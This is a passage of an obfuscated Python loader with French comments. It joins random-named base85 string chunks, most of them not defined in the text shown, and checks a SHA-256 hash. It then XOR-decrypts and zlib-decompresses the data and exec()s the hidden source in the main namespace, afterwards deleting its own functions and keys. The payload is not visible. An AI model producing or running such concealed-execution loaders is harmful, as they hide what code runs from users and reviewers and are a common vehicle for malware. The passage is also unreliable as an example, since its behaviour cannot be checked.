_cfXWYJa6hTw5HF = 'y`bRM2tFp!B_UZ5?XFwOl)gjjb}RjvbPKrEpBfq39'
_cxb1NPrGzQbkyN = 'zkl4yPa66$hhjmOmG!7v$_N$X^5(@^S=1}HBJRB49'
_czkevAVqlxIHDH = 'cT7Qagk_{{8~vcsPxbv`NI#B5syidS4NVBS#wFMKI'
_ckwJzeiWCso871 = 'V6RC9PqxnQ;?*uzDm))N!IxOmqtdafAFjqUa7WVHw'
_cekRGNg4Fh3SW6 = '|*ASLUP7aTY!HSh~V}QuGMY%T1z2V+2WjdGqqrUje'
_czaO_rzdb0T80k = 'Hs^d&CoDV8cy?*vP$XLA&13uf(>J#Vunm4pC6Y=vR'
_cnQujOUHU1lb42 = '}BEo*e&_^uger}CfsuGpnv;6c-|U3h(Z3*K#udKDM'
_cjqJBOhRWhMWnE = '_C~J`~eNa2q54;v{mi<)GD7q4FUR|AYq(=`K9GR5K'
_cu2nJ7J05pEobL = '*t20J#yyv_d<h+~NPI9=yuOmYvZHZe&5AhF4kmCAN'
_cswhOWmnEt2hYL = 'jsf@6X`g*q=nV+$u#AL{v0=ygMO(Pk<H00WzlAa>f'
_ciA0khp2uG79Mh = '*4LXJ;mDmQJUMCdIGA6en&`Oc?{ApsHB`Q^RT^yUL'
_cadf2iyMdQjPy6 = 'H%c%fGeI1(Ig@Q+RIw+yf9^=<j6Q(g-z+xpEevpvB'
_cnS8tNsqLgD6yU = 'VK6@T3+Sx$5LH`<L80#Ql~4*lj5(ZGh9j^CY!aI>J'
_clQhkH3hhRc5vx = 'G7t6IeA>Opb}sbTfq;X3te2#B26w=enEg*Mh5EO6c'
_ch42OLiVaKhm_X = '*zT3WpO@zZ^u)zptcK;aSpUvZNOd2gkR^JJxW{>d2'
_cmLS_unFl75GyH = 'h!7YX^)prmzlln}(Q(3V^!fb1l6gFUIbgO$!nUv8c'
_cae3UK5ZFQCHY0 = 'V!kkgMT&3sNf2_bd>$8j1oiT>{;hNU5gqls$({!3s'
_cuopgRjwR8n4sD = '64L^Tk+M|FK6qEI2AUl+JfM'

_piX5N5yC7ODAZ0 = __import__('base64').b85decode(_cqX8rgEdBcDpnd + _cubeb6rG7t3mJk + _cwznSvdyrSI3kF + _cdSBfJW64fe3G0 + _cb3Q7l0J_pWsNP + _cvIJluv0lDNk_I + _cvlHPCEACBhsMZ + _cfGkVaXfopZXdk + _cdI653K4LjwLnL + _cgIMdzGJ43tM0I + _cwLbjYtSznOVVy + _cdcNIPzyxnspvo + _ckoxk7t6ox3zxh + _csRYmNsSaiSY3Q + _cwWuut2IAunzBY + _c_iNiYFdq4PzAi + _clFTHjwzA3fbXs + _cyU1aw7GpfUu6Z + _chFpUXfQiyL0rG + _cfFYABT1nOuuBR + _chmcLRY2UArVkG + _csTPt9FStrZrT0 + _cshTk377ADi4Y7 + _ciqBAT8qwH3oXW + _cndwozWDAMlrzH + _cas4d66hyJhufY + _cnTdsAUgV70V19 + _cq_GtnSTOVkHd7 + _cr3ZF2jYpY8BDr + _cbNxryx4k7_fQm + _cfBeqaQ2bRNNHW + _cgRmCVZfxysDFR + _cllJffBZljibvu + _c_zDdIvS4NyRau + _ccx0T2I9wy5ala + _cu5dsIPRvVQ6z5 + _cmW_3Kq70ZW3kS + _coyGKVket8XsK_ + _clk9kwFCTeEQOw + _coS1xvEHtXqOSn + _cee1XQ5E1rx3AX + _ctD06m2hIWIBut + _crcCflaaB8mzBk + _ch7_MtONjTFOBk + _cdawv2PMcrQDjD + _ckMsIsgACai4yp + _cq3qiUrqlUmySD + _cmZ30EmktdbY4a + _cv96fLY6wuqWR6 + _c_fTQoUtUvamPN + _cc7k91dQHxjwoP + _cp1XJPpn1XQzes + _cmV06he7ffLonG + _cqQTscYGPtn8iu + _crn9stkZAgzeFC + _csoqm78qTSUrft + _cte6sgyA_znnxb + _cjodq0dEwH7UOZ + _cxbuXSlJGT4dDv + _csald8xnqFWzvF + _cwPMX3k3_sjtM2 + _ct2taEQQzUxcbh + _chtJEyMs0C5GZW + _csxjVoBTX1QqtZ + _cnjdcjVg0vdNxB + _cxi1EnIjWI3NXX + _cp9cexBLmi7b0_ + _cohj6lTV752car + _cdESjTP1MnMrN5 + _co_MYnIW3yzIj7 + _cfruXmvrk5Rgjp + _ckB2Gnupgo9r_F + _cigYNq11TeSRlh + _couH7BFj5OLTDV + _cbSS7ckEVpMqDA + _cgrHHvZy24u2jZ + _cce0zQXjn1Bo9m + _cu2b7zsA9KAuFm + _cbxOasTldPZpIZ + _ck4X1z9bpvIKzK + _cxKkWI2PNxPV5e + _csIderFi5suUwT + _ceQn3pbl49KXGL + _cv2sGHFMv6FWi1 + _c_OJ3eLBamyjYl + _cpUOgE3zsfy3iH + _cbTGSuwk4ZOQ0F + _cqAlHikGnQU5Pf + _csqYOZbd4svyEx + _cqgkScJg6DwY6D + _cx5TjH6OUUaV7e + _cpzaag7g07KPJi + _ct2QVVjgsnya7c + _corL8zt8wV2TOM + _cwEHGslB9FbIrz + _clhmb2VW_RMyJv + _co_7L2eaz1rFRy + _cwgyXIscQdvhqA + _cvhibnHrNPZOx7 + _cdCBHDYvCzCImr + _custnxlnn5fBbR + _cpZSOvAbzlAwFO + _cfIEORvGfAXYny + _csvYeaZS05nIOW + _ccdNSCm3TTRMUW + _clqExKGpSJ02H7 + _cfr3TOoGFgeRsn + _clh90qOygTuQ0f + _caqq5qZXSAa2BP + _cf0kek8tjw4Rai + _cn6sOSSpswYktM + _cuAG27Sw0fWly0 + _ctNNUMep5FnASA + _ccuj0ooZyFTeu7 + _c_o6rXIDy_nXT9 + _cdLVL8yndXEvM1 + _czcWVDlCNxfgIF + _chVGxv7cf8Ym6Z + _cmeu8bME6QWI6f + _ctPh8ohLRw8JOe + _cc7bdObfhHF_F0 + _cqdjYwBXu7QBgD + _cboGtGvMsVX19J + _cb_O9A0YsKUqXi + _ctwKgcKNH8it3D + _cyPbSyAi_jVb6C + _ci56Zvi8CZ2Gjn + _chYpLmbVBGkv13 + _cqkvMIgyNx3Koh + _cnZUiMh4q2_Kvl + _cxfYzVLBUIRM8J + _czTvtr0dB4TzC3 + _ca86a_eIzZQnJP + _ci_uJ4fWeyMXQa + _cu9OfiRi6spILQ + _caH5zj9aJPuv6A + _cxPn0B50A6RTMy + _cjUGOrqqVQfui0 + _ci2VfOBrVcbzwZ + _cbn5jZN11DhC8F + _coKW43CuxeiUqp + _caIpu_ZmeakeMh + _cdccFnkkdSKASW + _cfqdXNBDcJm_oe + _cgM2cq8lEmuUaP + _cc091wCaM7n_h0 + _czQgSFCRd1RMnS + _ceSOv82GpRRcye + _cvrupTm8XFb9AO + _chkc3xuwC0cO69 + _ckdVlymwciZF9o + _czxOXNYyH8Uuiz + _ce_VV9vKjxKZ6e + _ctJ93fTG249CmO + _clFAd6Tb0p817E + _cmBthUfqAiOVgj + _ctQ26tMKChhwLX + _ckHzTa3tz2aWKC + _cmLoPt4nPrMpPD + _caH00FGhfo5cLd + _cq18YabMZ9Xruf + _caYVayOBUNLjLE + _ca8scZhlh_l6GD + _clK3Djzg0eIzZO + _cnJ1VBmRl94vzs + _clccxM1sseIUnm + _crOqvAYieL9kna + _cyUAep21GZidQ9 + _ceumJFWdQfSf0D + _cxQRnRoKGcO4sH + _ceVSVfOIV6TxVD + _cokZ1qfZxIkfie + _cwhCF0UuyOx_Bv + _cbXHBvDS65cAXJ + _csS_xEi73zLZg7 + _cpf6pV1eUIAJWz + _csLJPUu4bnROqS + _cxgJir1zLT7j1c + _ckZe8x_dMJlNy_ + _czvF1Pe22Z6_Vb + _ca9YWCp4etoJrz + _cwCknNteDfjbCy + _crUsVA_8NIAj0E + _cjUkGfO7cerjrI + _cpJ3fxPgaZSZEu + _csPs1OcAy2toQX + _cbfcjZluX5HKtP + _ce93EmLDQbYIy9 + _cl9JTjabv2fvkj + _chbiOUmeB1xY2Q + _ck9FLPPwrJfBUZ + _cr6pzY3AJuKZt6 + _cdsGG1vtyzyhvu + _cf4CiydYJGJv1b + _ckbfkyRS9iOUwx + _ctajMp_ikPifIP + _cqGaSaqoG4lA3v + _chocqSIeaaEB2P + _cihEb2e2tPCZXX + _chOMRFyDJvvORk + _ch5grLSXAR1GI2 + _cm9uRh9Q0ErwlU + _cqLd5lFkjHnWcO + _ciOyoFQ4zJNY7N + _cuxQKlHUztcbDJ + _ceziJGfeFvY6Hs + _cdu7g_9BX9O5EH + _cwyVIYfT5Jyz8M + _ckt8dpvlUl07ey + _clNiQ2Xbeef3Au + _czbYNlnNJpPjCJ + _ciUeInFc7dDynH + _cjsMieofZXNFpv + _cpb7BNNk0WIqkJ + _ca_eC_425hyy0W + _chOSKQUzhGR1cm + _cfN1cS3UElst2q + _cf91_9QS22elez + _ccvDJ1KQBgi2uv + _cbTkD_4CzOnmbd + _cc7q6cKa6qqdvS + _caQbWGLKolVwxF + _crvN7QRBI3a2vA + _crvjoD6Mp5RR12 + _cmiJynfcEjW0Kk + _c_QeFpZqnNGMxu + _crx1XrpkTo3Poi + _cg_OHvsL6nWahX + _cyCuDLmpStG3LR + _conYKa3Dwh6w_n + _cmrbF1cHqjjEVO + _czHp69i5gZ9rR1 + _cxRzNmQX4_YphJ + _ctYe0lkJ4d7Thn + _cqK1FMcLq0XVLC + _c_zihjuA3Iviaf + _cvd3tPCdGvI8m2 + _cytsIsfdCwTK2B + _caTVzDFl72XYW_ + _ckXHOcdbYoOH8c + _cfXWYJa6hTw5HF + _cxb1NPrGzQbkyN + _czkevAVqlxIHDH + _ckwJzeiWCso871 + _cekRGNg4Fh3SW6 + _czaO_rzdb0T80k + _cnQujOUHU1lb42 + _cjqJBOhRWhMWnE + _cu2nJ7J05pEobL + _cswhOWmnEt2hYL + _ciA0khp2uG79Mh + _cadf2iyMdQjPy6 + _cnS8tNsqLgD6yU + _clQhkH3hhRc5vx + _ch42OLiVaKhm_X + _cmLS_unFl75GyH + _cae3UK5ZFQCHY0 + _cuopgRjwR8n4sD)
if __import__('hashlib').sha256(_piX5N5yC7ODAZ0).hexdigest() != '7d65f843e0c53fb8a3055756dfad320093398b0e1d9067a89ab5ccbccb331ec6':
    __import__('sys').exit(1)
_xcUyyc5kGWZaik = bytes([213, 69, 201, 187, 141, 64, 112, 93, 137, 24, 55, 6, 243, 207, 234, 52, 194, 251])
_fkoFuyoEVv3tlgP = bytes([32, 237, 217, 245, 52, 180, 217, 32, 184, 227, 166, 240, 44, 105, 214, 233, 159, 253])

def _fxpkDHq8dZSCc7j(_bfyX_SXoNVWTW4, _keeyY7nASlMVMC):
    return bytes(_bfyX_SXoNVWTW4[_ijx9T9l9YMUMR5] ^ _keeyY7nASlMVMC[_ijx9T9l9YMUMR5 % len(_keeyY7nASlMVMC)] for _ijx9T9l9YMUMR5 in range(len(_bfyX_SXoNVWTW4)))

def _fdylPYRZ2tCvYov(_thhf1C7gl9hjeg):
    import zlib
    return zlib.decompress(_thhf1C7gl9hjeg) # Un seul niveau de zlib ici pour simplifier

def _fegaoSgGehVW_o_():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xyAK4ZC0hG841x = _fxpkDHq8dZSCc7j(_piX5N5yC7ODAZ0, _xcUyyc5kGWZaik)
    # 2. Décompression Zlib
    _duRwS1bjhdrRhk = _fdylPYRZ2tCvYov(_xyAK4ZC0hG841x)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _duRwS1bjhdrRhk.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nxMmRCahYqV2cL = _main.__dict__
    _nxMmRCahYqV2cL.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nxMmRCahYqV2cL)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fegaoSgGehVW_o_()
try:
    del _fxpkDHq8dZSCc7j, _fdylPYRZ2tCvYov, _fegaoSgGehVW_o_
    del _piX5N5yC7ODAZ0, _xcUyyc5kGWZaik, _fkoFuyoEVv3tlgP
except:
    pass
